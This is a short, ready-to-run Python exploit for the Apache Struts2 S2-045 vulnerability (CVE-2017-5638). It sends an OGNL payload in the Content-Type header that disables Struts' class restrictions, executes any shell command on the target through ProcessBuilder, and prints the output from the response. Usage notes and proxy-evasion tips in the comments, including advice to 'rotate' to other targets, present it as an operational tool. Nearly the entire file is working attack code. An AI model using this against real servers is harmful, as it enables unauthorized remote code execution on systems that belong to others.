#!/usr/bin/env python3
# [REFERENCE] S2-045 (CVE-2017-5638) — Struts2 Jakarta multipart Content-Type OGNL RCE.
# Fingerprint: Java app with .action/.do routes or Struts error pages. Affects
# Struts 2.3.5-2.3.31 / 2.5-2.5.10 (and unpatched derivatives). One request; the
# OGNL runs in the Content-Type parsing error path.
# Usage: python3 struts2-s2-045-ognl.py http://TARGET/app.action 'id'
import requests, sys, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/index.action"
CMD = sys.argv[2] if len(sys.argv) > 2 else "id"

OGNL = ("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
        "(#cmd='%s').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" % CMD)

r = requests.get(BASE, headers={"Content-Type": OGNL}, verify=False, timeout=15)
print("status:", r.status_code)
print(r.text[:1000])
# Command output comes back in the response body. Empty 400/500 with no output ->
# patched or wrong framework; write verdict and rotate (don't hand-tune OGNL past a
# couple of shell variants — %-encoding of the payload is the usual fix on mangling
# proxies: keep the %%{ form and avoid spaces via ${#cmd='id'} quoting).
